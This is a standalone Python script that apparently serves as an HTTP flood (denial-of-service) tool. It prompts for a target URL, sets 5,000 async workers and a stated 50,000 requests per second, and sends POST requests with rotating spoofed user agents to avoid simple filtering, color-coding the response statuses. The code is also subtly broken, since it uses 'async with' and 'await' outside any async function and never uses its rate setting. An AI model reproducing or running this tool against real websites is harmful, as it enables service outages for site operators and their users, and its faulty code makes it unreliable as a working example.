import asyncio
import aiohttp
import random
from termcolor import colored

# Define the number of requests per second
requests_per_second = 50000

# Define the number of workers
num_workers = 5000

# Define the user agents and headers
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
]
headers = {
    'Accept-Language': 'en-US,en;q=0.8',
    'Connection': 'keep-alive',
}

# Define the colors for the status code
colors = {
    200: 'green',
    201: 'green',
    202: 'green',
    203: 'green',
    204: 'green',
    205: 'green',
    206: 'green',
    207: 'green',
    208: 'green',
    226: 'green',
    400: 'red',
    401: 'red',
    402: 'red',
    403: 'red',
    404: 'red',
    405: 'red',
    406: 'red',
    407: 'red',
    408: 'red',
    409: 'red',
    410: 'red',
    411: 'red',
    412: 'red',
    413: 'red',
    414: 'red',
    415: 'red',
    416: 'red',
    417: 'red',
    418: 'red',
    421: 'red',
    422: 'red',
    423: 'red',
    424: 'red',
    425: 'red',
    426: 'red',
    428: 'red',
    429: 'red',
    431: 'red',
    451: 'red',
    500: 'red',
    501: 'red',
    502: 'red',
    503: 'red',
    504: 'red',
    505: 'red',
    506: 'red',
    507: 'red',
    508: 'red',
    510: 'red',
    511: 'red',
}

# Define a function to send HTTP POST requests
async def send_request(session, url):
    # Create a request with a random user agent and headers
    headers['User-Agent'] = random.choice(user_agents)
    async with session.post(url, headers=headers) as response:
        # Print the status code with color
        color = colors.get(response.status, 'red')
        print(colored(response.status, color), end=' ')

# Define a function to process the queue of URLs
async def process_queue(q, session):
    while True:
        url = await q.get()
        await send_request(session, url)
        q.task_done()

# Create a prompt for the URL
url = input('Enter URL: ')

# Create a client with a fast asyncio HTTP client
async with aiohttp.ClientSession() as session:
    # Create a queue for the URLs
    q = asyncio.Queue()

    # Add the URLs to the queue
    for i in range(num_workers):
        q.put_nowait(url)

    # Start the workers
    tasks = []
    for i in range(num_workers):
        task = asyncio.create_task(process_queue(q, session))
        tasks.append(task)

    # Wait for the queue to be processed
    await q.join()

    # Cancel the tasks
    for task in tasks:
        task.cancel()
